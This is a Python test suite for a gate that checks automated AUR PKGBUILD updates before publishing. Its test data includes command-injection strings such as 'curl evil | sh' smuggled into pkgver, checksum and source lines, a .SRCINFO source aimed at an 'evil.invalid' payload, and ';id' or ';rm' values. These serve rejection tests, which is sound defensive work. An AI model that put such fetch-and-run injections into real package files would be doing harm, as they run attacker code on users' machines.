#!/usr/bin/env python3
"""Tests for the sealed PKGBUILD gate."""

from __future__ import annotations

import hashlib
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import publish_artifact as gate
import update_package as up

H1 = "ab" * 32
H2 = "cd" * 32
H3 = "ef" * 32

BASELINE = f"""pkgname=maple-mono-nf-cn
pkgver=7.9
pkgrel=1
source=("https://example.invalid/MapleMono.zip")
sha256sums=('{H1}'
            '{H2}')
"""


def sources_of(pkgbuild: str) -> str:
    """The --expected-sources value an honest host would compute."""
    import json

    return json.dumps(gate.parse_sources("test", pkgbuild))


def write_pkgbuild(directory: Path, pkgbuild: str) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "PKGBUILD").write_text(pkgbuild, encoding="utf-8")


class StageTest(unittest.TestCase):
    def stage(self, root: Path, pkgbuild: str, baseline: str = BASELINE, package: str = "maple-mono-nf-cn") -> Path:
        base = root / "baseline"
        base.write_text(baseline, encoding="utf-8")
        out = root / "out"
        write_pkgbuild(out, pkgbuild)
        stage = root / "stage"
        gate.stage(package, base, out, stage)
        return stage

    def test_checksum_edit_is_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace(H1, H3)
            stage = self.stage(Path(tmp), updated)
            manifest = (stage / "MANIFEST").read_text(encoding="utf-8")
            self.assertIn("status=publish", manifest)
            self.assertNotIn("srcinfo=", manifest)
            digest = hashlib.sha256(updated.encode()).hexdigest()
            self.assertIn(f"pkgbuild={digest}", manifest)
            self.assertEqual(sorted(path.name for path in stage.iterdir()), ["MANIFEST", "PKGBUILD"])

    def test_build_cannot_change_pkgver_or_pkgrel(self) -> None:
        # Was "pkgver and pkgrel edits are accepted": the build container
        # could pick any version (Quinn: moonbit pkgver=99999 passed).
        cases = (
            (BASELINE.replace("pkgver=7.9", "pkgver=7.10").replace("pkgrel=1", "pkgrel=2"), "pkgver"),
            (BASELINE.replace("pkgver=7.9", "pkgver=99999"), "pkgver from the host value 7.9 to 99999"),
            (BASELINE.replace("pkgrel=1", "pkgrel=99999"), "pkgrel from the host value 1 to 99999"),
        )
        for updated, needle in cases:
            with self.subTest(needle=needle), tempfile.TemporaryDirectory() as tmp:
                with self.assertRaises(SystemExit) as caught:
                    self.stage(Path(tmp), updated)
                self.assertIn(needle, str(caught.exception))

    def test_source_url_edit_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace("example.invalid", "evil.invalid")
            with self.assertRaises(SystemExit) as caught:
                self.stage(Path(tmp), updated)
            self.assertIn("beyond pkgver", str(caught.exception))

    def test_unsafe_pkgver_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace("pkgver=7.9", "pkgver=7.9; curl evil | sh")
            with self.assertRaises(SystemExit) as caught:
                self.stage(Path(tmp), updated)
            self.assertIn("unsafe pkgver", str(caught.exception))

    def test_smuggled_checksum_lines_are_rejected(self) -> None:
        variants = {
            "semicolon": f"sha256sums=('{H1}'); curl evil | sh",
            "and": f"sha256sums=('{H1}') && curl evil | sh",
            "command": "sha256sums=('$(curl evil)')",
            "backtick": "sha256sums=('`curl evil`')",
            "comment": f"sha256sums=('{H1}') # keep",
            "uppercase": "sha256sums=('AB" + ("ab" * 31) + "')",
            "short": "sha256sums=('abcd')",
            "injected": f"sha256sums=('{H1}'\ncurl evil | sh\n'{H2}')",
            "skip": "sha256sums=('SKIP')",
        }
        for name, sums in variants.items():
            with self.subTest(name=name):
                updated = "pkgname=maple-mono-nf-cn\npkgver=7.9\npkgrel=1\n" + sums + "\n"
                baseline = (
                    "pkgname=maple-mono-nf-cn\npkgver=7.9\npkgrel=1\n"
                    f"sha256sums=('{H1}')\n"
                )
                with tempfile.TemporaryDirectory() as tmp:
                    with self.assertRaises(SystemExit):
                        self.stage(Path(tmp), updated, baseline)

    def test_arch_specific_sums_and_multiline_are_accepted(self) -> None:
        baseline = (
            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
            f"sha256sums_x86_64=('{H1}')\n"
            f"sha256sums_aarch64=('{H2}')\n"
        )
        updated = baseline.replace(H1, H3)
        with tempfile.TemporaryDirectory() as tmp:
            self.stage(Path(tmp), updated, baseline, "memprocfs")

    def test_git_skip_and_abbrev_growth(self) -> None:
        baseline = (
            "pkgname=cuda-api-wrappers-git\n"
            "pkgver=0.8.2.r0.gc2f2a2b\n"
            "pkgrel=1\n"
            "sha256sums=('SKIP')\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.stage(
                root,
                baseline.replace("gc2f2a2b", "gc2f2a2b1"),
                baseline,
                "cuda-api-wrappers-git",
            )
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(SystemExit) as caught:
                self.stage(
                    Path(tmp),
                    baseline.replace("gc2f2a2b", "deadbeef"),
                    baseline,
                    "cuda-api-wrappers-git",
                )
            self.assertIn("not the same commit", str(caught.exception))

    def test_extra_file_and_symlink_are_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            base = root / "baseline"
            base.write_text(BASELINE, encoding="utf-8")
            out = root / "out"
            write_pkgbuild(out, BASELINE)
            (out / "publish.sh").write_text("echo pwned\n", encoding="utf-8")
            with self.assertRaises(SystemExit):
                gate.stage("maple-mono-nf-cn", base, out, root / "stage")
            linked = root / "linked"
            linked.mkdir()
            (linked / "PKGBUILD").symlink_to(base)
            with self.assertRaises(SystemExit):
                gate.stage("maple-mono-nf-cn", base, linked, root / "stage2")


class ImportTest(unittest.TestCase):
    def test_import_rejects_unregistered_packages(self) -> None:
        cases = {
            "foo-bin": "RELEASE_PACKAGES",
            "foo-git": "GIT_REPOS",
            "asus-fa401km-acpi-fix": "RELEASE_PACKAGES",
        }
        for package, registry in cases.items():
            for status in ("publish", "skip"):
                with self.subTest(package=package, status=status), tempfile.TemporaryDirectory() as tmp:
                    root = Path(tmp)
                    artifact = root / "artifact"
                    if status == "publish":
                        write_pkgbuild(artifact, BASELINE.replace("maple-mono-nf-cn", package))
                        gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
                    else:
                        artifact.mkdir()
                        gate.write_manifest(artifact, "skip", {})
                    dest = root / package
                    dest.mkdir()
                    (dest / "PKGBUILD").write_text("keep\n", encoding="utf-8")
                    with self.assertRaises(SystemExit) as caught:
                        gate.import_artifact(package, artifact, dest)
                    self.assertIn(registry, str(caught.exception))
                    self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), "keep\n")

    def test_import_replaces_pkgbuild_only(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            updated = BASELINE.replace(H1, H3)
            stage = StageTest().stage(root, updated)
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            (dest / ".SRCINFO").write_text("old\n", encoding="utf-8")
            (dest / "extra.txt").write_text("keep\n", encoding="utf-8")
            gate.import_artifact("maple-mono-nf-cn", stage, dest, "7.9", None, "1", sources_of(BASELINE))
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), updated)
            self.assertEqual((dest / ".SRCINFO").read_text(encoding="utf-8"), "old\n")
            self.assertEqual((dest / "extra.txt").read_text(encoding="utf-8"), "keep\n")

    def test_import_refuses_a_downgrade(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = StageTest().stage(root, BASELINE)
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            current = BASELINE.replace("pkgver=7.9", "pkgver=8.0")
            (dest / "PKGBUILD").write_text(current, encoding="utf-8")
            with self.assertRaises(SystemExit) as caught:
                gate.import_artifact("maple-mono-nf-cn", stage, dest, "7.9", None, "1", sources_of(BASELINE))
            self.assertIn("older", str(caught.exception))
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), current)

    def test_import_allows_a_strict_source_url_change(self) -> None:
        old = (
            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
            'source_x86_64=("https://example.invalid/old.tar.gz")\n'
            f"sha256sums_x86_64=('{H1}')\n"
        )
        new = old.replace("old.tar.gz", "new.tar.gz").replace(H1, H3).replace("pkgrel=20261014", "pkgrel=20261101")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, new)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "memprocfs"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(old, encoding="utf-8")
            gate.import_artifact("memprocfs", artifact, dest, "5.19.0", None, "20261101", sources_of(new))
            self.assertIn("new.tar.gz", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    def test_import_rejects_shell_in_source_and_srcinfo_payload(self) -> None:
        old = (
            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
            'source_x86_64=("https://example.invalid/old.tar.gz")\n'
            f"sha256sums_x86_64=('{H1}')\n"
        )
        new = old.replace(
            'source_x86_64=("https://example.invalid/old.tar.gz")',
            'source_x86_64=("https://example.invalid/old.tar.gz"); curl evil | sh',
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, new)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "memprocfs"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(old, encoding="utf-8")
            with self.assertRaises(SystemExit):
                gate.import_artifact("memprocfs", artifact, dest)

        smuggled_srcinfo = (
            "pkgbase = maple-mono-nf-cn\n"
            "\tsource = https://evil.invalid/payload\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, BASELINE)
            (artifact / ".SRCINFO").write_text(smuggled_srcinfo, encoding="utf-8")
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            with self.assertRaises(SystemExit) as caught:
                gate.import_artifact("maple-mono-nf-cn", artifact, dest)
            self.assertIn("unexpected artifact files", str(caught.exception))

    def test_import_allows_the_same_git_commit_with_a_shorter_hash(self) -> None:
        current = (
            "pkgname=cuda-api-wrappers-git\n"
            "pkgver=0.8.2.r0.gc2f2a2b1\n"
            "pkgrel=1\n"
            "sha256sums=('SKIP')\n"
        )
        updated = current.replace("gc2f2a2b1", "gc2f2a2b")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, updated)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "cuda-api-wrappers-git"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(current, encoding="utf-8")
            gate.import_artifact(
                "cuda-api-wrappers-git",
                artifact,
                dest,
                "0.8.2.r0.gc2f2a2b",
                "c2f2a2b1" + "0" * 32,
            )
            self.assertIn("pkgver=0.8.2.r0.gc2f2a2b\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    REFLECTCPP_R10 = (
        "pkgname=reflectcpp-git\n"
        "pkgver=0.26.2.r10.g587b72ee\n"
        "pkgrel=1\n"
        "sha256sums=('SKIP')\n"
    )
    REFLECTCPP_R12 = REFLECTCPP_R10.replace("r10.g587b72ee", "r12.g5457ea3c")

    # Full commits as the publish host would resolve them upstream.
    COMMITS = {
        "587b72ee": "587b72ee" + "1" * 32,
        "5457ea3c": "5457ea3c" + "2" * 32,
    }

    def import_git(
        self,
        current: str,
        updated: str,
        expected: str | None = "from-updated",
        commit: str | None = "from-expected",
    ) -> Path:
        """Import updated over current. By default the host-computed pkgver
        equals the artifact pkgver, as for an honest build."""
        if expected == "from-updated":
            expected = gate.read_var(updated, "pkgver")
        if commit == "from-expected":
            commit = None
            if expected:
                abbrev = expected.rsplit(".g", 1)[1]
                commit = self.COMMITS.get(abbrev, abbrev.ljust(40, "0"))
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        artifact = root / "artifact"
        write_pkgbuild(artifact, updated)
        gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
        dest = root / "reflectcpp-git"
        dest.mkdir()
        (dest / "PKGBUILD").write_text(current, encoding="utf-8")
        self.dest = dest
        gate.import_artifact("reflectcpp-git", artifact, dest, expected, commit)
        return dest

    def test_import_allows_a_newer_git_commit(self) -> None:
        dest = self.import_git(self.REFLECTCPP_R10, self.REFLECTCPP_R12)
        self.assertIn("pkgver=0.26.2.r12.g5457ea3c\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    def test_import_refuses_an_older_git_commit(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            self.import_git(self.REFLECTCPP_R12, self.REFLECTCPP_R10)
        self.assertIn("older", str(caught.exception))

    def test_import_still_rejects_other_edits_on_a_git_bump(self) -> None:
        updated = self.REFLECTCPP_R12 + "install=evil.install\n"
        with self.assertRaises(SystemExit) as caught:
            self.import_git(self.REFLECTCPP_R10, updated)
        self.assertIn("changed beyond", str(caught.exception))

    def test_stage_still_requires_the_same_git_commit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(SystemExit) as caught:
                StageTest().stage(Path(tmp), self.REFLECTCPP_R12, self.REFLECTCPP_R10, "reflectcpp-git")
            self.assertIn("not the same commit", str(caught.exception))

    # Host-computed pkgver (follow-up to PR #1).

    def assert_rejected(self, current: str, updated: str, expected: str | None, needle: str) -> None:
        with self.assertRaises(SystemExit) as caught:
            self.import_git(current, updated, expected)
        self.assertIn(needle, str(caught.exception))
        self.assertEqual((self.dest / "PKGBUILD").read_text(encoding="utf-8"), current)

    def test_host_pkgver_match_is_accepted(self) -> None:
        dest = self.import_git(self.REFLECTCPP_R12, self.REFLECTCPP_R12, "0.26.2.r12.g5457ea3c")
        self.assertIn("pkgver=0.26.2.r12.g5457ea3c\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    def test_normal_upgrade_r10_to_r12_is_accepted_when_host_expects_r12(self) -> None:
        dest = self.import_git(self.REFLECTCPP_R10, self.REFLECTCPP_R12, "0.26.2.r12.g5457ea3c")
        self.assertIn("pkgver=0.26.2.r12.g5457ea3c\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    def test_same_rn_other_hash_is_rejected_in_both_orders(self) -> None:
        # deadbeef sorts after 5457ea3c and 0123abcd sorts before it. Under
        # vercmp alone one of these would pass; both must fail now.
        for other in ("deadbeef", "0123abcd"):
            for current in (self.REFLECTCPP_R10, self.REFLECTCPP_R12):
                with self.subTest(other=other, current=current.splitlines()[1]):
                    updated = self.REFLECTCPP_R12.replace("g5457ea3c", f"g{other}")
                    self.assert_rejected(current, updated, "0.26.2.r12.g5457ea3c", "does not match")

    def test_host_expected_other_hash_rejects_either_artifact(self) -> None:
        # Swap roles: the host resolved deadbeef / 0123abcd, the artifact says 5457ea3c.
        for other in ("deadbeef", "0123abcd"):
            with self.subTest(other=other):
                self.assert_rejected(
                    self.REFLECTCPP_R10, self.REFLECTCPP_R12, f"0.26.2.r12.g{other}", "does not match"
                )

    def test_huge_rn_is_rejected(self) -> None:
        updated = self.REFLECTCPP_R12.replace("r12.g5457ea3c", "r99999.g5457ea3c")
        self.assert_rejected(self.REFLECTCPP_R10, updated, "0.26.2.r12.g5457ea3c", "does not match")

    def test_missing_expected_pkgver_fails_closed(self) -> None:
        for missing in (None, ""):
            with self.subTest(missing=missing):
                self.assert_rejected(self.REFLECTCPP_R10, self.REFLECTCPP_R12, missing, "missing host-computed")

    def test_missing_or_wrong_expected_commit_fails_closed(self) -> None:
        for commit, needle in ((None, "expected-commit"), ("", "expected-commit"), ("deadbeef" * 5, "is not commit")):
            with self.subTest(commit=commit):
                with self.assertRaises(SystemExit) as caught:
                    self.import_git(self.REFLECTCPP_R10, self.REFLECTCPP_R12, "0.26.2.r12.g5457ea3c", commit)
                self.assertIn(needle, str(caught.exception))

    def test_cli_import_without_expected_pkgver_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, self.REFLECTCPP_R12)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "reflectcpp-git"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(self.REFLECTCPP_R10, encoding="utf-8")
            argv = ["publish_artifact.py", "import", "--package", "reflectcpp-git",
                    "--artifact", str(artifact), "--dest", str(dest)]
            for extra in ([], ["--expected-pkgver", "", "--expected-commit", ""]):
                with self.subTest(extra=extra):
                    with self.assertRaises(SystemExit) as caught:
                        gate.main(argv + extra)
                    self.assertIn("missing host-computed", str(caught.exception))
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), self.REFLECTCPP_R10)

    def test_git_skip_artifact_needs_no_expected_pkgver(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = root / "stage"
            gate.stage_skip(stage)
            dest = root / "reflectcpp-git"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(self.REFLECTCPP_R10, encoding="utf-8")
            gate.import_artifact("reflectcpp-git", stage, dest)
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), self.REFLECTCPP_R10)

    MOONBIT = (
        "pkgname=moonbit-bin\npkgver=0.1.20261023\npkgrel=2\n"
        'source=("https://cli.moonbitlang.cn/binaries/latest/moonbit-linux-x86_64.tar.gz#filename=${pkgname}-${pkgver}-linux-x86_64.tar.gz"\n'
        '  "https://cli.moonbitlang.cn/cores/core-latest.tar.gz#filename=moonbit-core-${pkgver}.tar.gz"\n'
        '  "moon.sh")\n'
        f"sha256sums=('{H1}')\n"
    )

    def import_release(self, current: str, updated: str, *expected) -> Path:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        artifact = root / "artifact"
        write_pkgbuild(artifact, updated)
        gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
        package = gate.read_var(current, "pkgname")
        dest = root / package
        dest.mkdir()
        (dest / "PKGBUILD").write_text(current, encoding="utf-8")
        self.dest = dest
        if len(expected) == 3:
            expected = (*expected, sources_of(updated))
        gate.import_artifact(package, artifact, dest, *expected)
        return dest

    def test_release_import_without_expected_values_fails_closed(self) -> None:
        # Replaces the old "non-git import is unchanged without expected
        # pkgver" case: release packages now require host values too.
        old = self.MOONBIT
        bumped = old.replace("20261023", "20261101").replace("pkgrel=2", "pkgrel=1").replace(H1, H3)
        for new in (bumped, old):
            for expected in ((), (None, None, None), ("", "", "")):
                with self.subTest(new=new.splitlines()[1], expected=expected):
                    with self.assertRaises(SystemExit) as caught:
                        self.import_release(old, new, *expected)
                    self.assertIn("missing host-computed --expected-pkgver", str(caught.exception))
                    self.assertEqual((self.dest / "PKGBUILD").read_text(encoding="utf-8"), old)

    def test_release_import_requires_expected_pkgrel(self) -> None:
        for rel in (None, "", "x", "1;id"):
            with self.subTest(rel=rel):
                with self.assertRaises(SystemExit) as caught:
                    self.import_release(self.MOONBIT, self.MOONBIT, "0.1.20261023", None, rel)
                self.assertIn("expected-pkgrel", str(caught.exception))

    def test_release_import_exact_match_is_accepted(self) -> None:
        bumped = self.MOONBIT.replace("20261023", "20261101").replace("pkgrel=2", "pkgrel=1").replace(H1, H3)
        for new, ver, rel in ((bumped, "0.1.20261101", "1"), (self.MOONBIT, "0.1.20261023", "2")):
            with self.subTest(ver=ver, rel=rel):
                dest = self.import_release(self.MOONBIT, new, ver, None, rel)
                self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), new)

    def test_release_import_rejects_pkgver_or_pkgrel_mismatch(self) -> None:
        bumped = self.MOONBIT.replace("20261023", "20261101").replace("pkgrel=2", "pkgrel=1").replace(H1, H3)
        cases = (
            # artifact claims a newer upstream than the host sees
            (bumped, "0.1.20261023", "2", "does not match the host-computed pkgver"),
            # repo-only pkgrel bump the host does not know about
            (self.MOONBIT.replace("pkgrel=2", "pkgrel=3"), "0.1.20261023", "2", "pkgrel 3 does not match"),
            # huge pkgrel that would block later updates
            (self.MOONBIT.replace("pkgrel=2", "pkgrel=999"), "0.1.20261023", "2", "pkgrel 999 does not match"),
            (bumped, "0.1.20261101", "2", "pkgrel 1 does not match"),
        )
        for new, ver, rel, needle in cases:
            with self.subTest(needle=needle):
                with self.assertRaises(SystemExit) as caught:
                    self.import_release(self.MOONBIT, new, ver, None, rel)
                self.assertIn(needle, str(caught.exception))
                self.assertEqual((self.dest / "PKGBUILD").read_text(encoding="utf-8"), self.MOONBIT)

    def test_release_import_still_refuses_a_downgrade(self) -> None:
        older = self.MOONBIT.replace("20261023", "20261001").replace("pkgrel=2", "pkgrel=1")
        with self.assertRaises(SystemExit) as caught:
            self.import_release(self.MOONBIT, older, "0.1.20261001", None, "1")
        self.assertIn("older", str(caught.exception))

    def test_release_skip_artifact_needs_no_expected_value(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = root / "stage"
            gate.stage_skip(stage)
            dest = root / "moonbit-bin"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(self.MOONBIT, encoding="utf-8")
            gate.import_artifact("moonbit-bin", stage, dest)
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), self.MOONBIT)

    def test_unlisted_non_git_package_is_refused(self) -> None:
        # It used to pass with no pkgver/pkgrel/source checks at all.
        old = "pkgname=asus-fa401km-acpi-fix\npkgver=1.0.0\npkgrel=1\n" f"sha256sums=('{H1}')\n"
        new = old.replace("pkgrel=1", "pkgrel=2").replace(H1, H3)
        with self.assertRaises(SystemExit) as caught:
            self.import_release(old, new)
        self.assertIn("RELEASE_PACKAGES", str(caught.exception))

    def test_cli_passes_expected_pkgrel(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, self.MOONBIT)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "moonbit-bin"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(self.MOONBIT, encoding="utf-8")
            argv = ["publish_artifact.py", "import", "--package", "moonbit-bin",
                    "--artifact", str(artifact), "--dest", str(dest),
                    "--expected-pkgver", "0.1.20261023", "--expected-commit", "",
                    "--expected-sources", sources_of(self.MOONBIT)]
            with self.assertRaises(SystemExit) as caught:
                gate.main(argv + ["--expected-pkgrel", "1"])
            self.assertIn("pkgrel 2 does not match", str(caught.exception))
            out = root / "out"
            with mock.patch.dict(os.environ, {"GITHUB_OUTPUT": str(out)}):
                gate.main(argv + ["--expected-pkgrel", "2"])
            self.assertIn("publish=true", out.read_text(encoding="utf-8"))


class ExpectTest(unittest.TestCase):
    R12 = ImportTest.REFLECTCPP_R12

    def artifact(self, root: Path, pkgbuild: str) -> Path:
        artifact = root / "artifact"
        write_pkgbuild(artifact, pkgbuild)
        gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
        return artifact

    def run_expect(self, artifact: Path, package: str = "reflectcpp-git") -> dict[str, str]:
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "out"
            with mock.patch.dict(os.environ, {"GITHUB_OUTPUT": str(out)}):
                gate.expect(package, artifact)
            return dict(line.split("=", 1) for line in out.read_text(encoding="utf-8").splitlines())

    def test_expect_resolves_the_commit_named_by_the_artifact(self) -> None:
        calls = []

        def fake(url: str, abbrev: str) -> tuple[str, str]:
            calls.append((url, abbrev))
            return "0.26.2.r12.g5457ea3c", "5457ea3c" + "2" * 32

        with tempfile.TemporaryDirectory() as tmp, mock.patch.object(up, "git_commit_pkgver", fake):
            # The artifact claims r99999; the host still reports what upstream says.
            claimed = self.R12.replace("r12.", "r99999.")
            outputs = self.run_expect(self.artifact(Path(tmp), claimed))
        self.assertEqual(calls, [("https://github.com/getml/reflect-cpp.git", "5457ea3c")])
        self.assertEqual(outputs, {"pkgver": "0.26.2.r12.g5457ea3c", "commit": "5457ea3c" + "2" * 32})

    def test_expect_skip_artifact_outputs_empty(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            stage = Path(tmp) / "stage"
            gate.stage_skip(stage)
            self.assertEqual(self.run_expect(stage), {"pkgver": "", "commit": ""})

    def test_expect_refuses_non_git_and_hashless_pkgver(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            artifact = self.artifact(Path(tmp), BASELINE)
            with self.assertRaises(SystemExit):
                self.run_expect(artifact, "maple-mono-nf-cn")
        with tempfile.TemporaryDirectory() as tmp:
            artifact = self.artifact(Path(tmp), self.R12.replace("r12.g5457ea3c", "r12"))
            with self.assertRaises(SystemExit) as caught:
                self.run_expect(artifact)
            self.assertIn("git hash", str(caught.exception))


class GitCommitPkgverTest(unittest.TestCase):
    """git_commit_pkgver against a local upstream repository (offline)."""

    def git(self, *args: str) -> str:
        return subprocess.check_output(
            ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid",
             "-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false", *args],
            cwd=self.repo, text=True, stderr=subprocess.DEVNULL,
        ).strip()

    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.repo = Path(tmp.name) / "upstream"
        self.repo.mkdir()
        self.git("init", "-q", "-b", "main")
        self.git("commit", "-q", "--allow-empty", "-m", "base")
        self.git("tag", "v0.26.2")
        self.commits = []
        for index in range(12):
            self.git("commit", "-q", "--allow-empty", "-m", f"c{index}")
            self.commits.append(self.git("rev-parse", "HEAD"))
        self.git("checkout", "-q", "-b", "side", self.commits[9])
        self.git("commit", "-q", "--allow-empty", "-m", "side")
        self.side = self.git("rev-parse", "HEAD")
        self.git("checkout", "-q", "main")

    def test_pkgver_of_a_pinned_commit(self) -> None:
        r12 = self.commits[11]
        pkgver, full = up.git_commit_pkgver(str(self.repo), r12[:8])
        self.assertEqual(pkgver, f"0.26.2.r12.g{r12[:8]}")
        self.assertEqual(full, r12)
        r10 = self.commits[9]
        pkgver, _ = up.git_commit_pkgver(str(self.repo), r10[:7])
        self.assertEqual(pkgver, f"0.26.2.r10.g{r10[:7]}")

    def test_unknown_commit_is_refused(self) -> None:
        missing = "deadbeef" if not any(c.startswith("deadbeef") for c in self.commits) else "0badf00d"
        with self.assertRaises(SystemExit) as caught:
            up.git_commit_pkgver(str(self.repo), missing)
        self.assertIn("does not exist upstream", str(caught.exception))

    def test_commit_off_the_default_branch_is_refused(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            up.git_commit_pkgver(str(self.repo), self.side[:8])
        self.assertIn("not on the upstream default branch", str(caught.exception))

    def test_bad_abbreviation_is_refused(self) -> None:
        for bad in ("abc", "XYZ12345", "1234567;rm"):
            with self.subTest(bad=bad), self.assertRaises(SystemExit):
                up.git_commit_pkgver(str(self.repo), bad)

    def test_skip_marker_does_not_touch_the_checkout(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = root / "stage"
            gate.stage_skip(stage)
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            gate.import_artifact("maple-mono-nf-cn", stage, dest)
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), BASELINE)

    def test_nested_download_directory_is_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = StageTest().stage(root, BASELINE)
            nested = root / "download"
            nested.mkdir()
            stage.rename(nested / "aur-stage")
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            gate.import_artifact("maple-mono-nf-cn", nested, dest, "7.9", None, "1", sources_of(BASELINE))
            self.assertFalse((dest / ".SRCINFO").exists())

    def test_manifest_hash_mismatch_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = StageTest().stage(root, BASELINE)
            manifest = stage / "MANIFEST"
            text = manifest.read_text(encoding="utf-8")
            text = text.replace(text.split("pkgbuild=", 1)[1][:8], "00000000")
            manifest.write_text(text, encoding="utf-8")
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            with self.assertRaises(SystemExit) as caught:
                gate.import_artifact("maple-mono-nf-cn", stage, dest)
            self.assertIn("hash", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
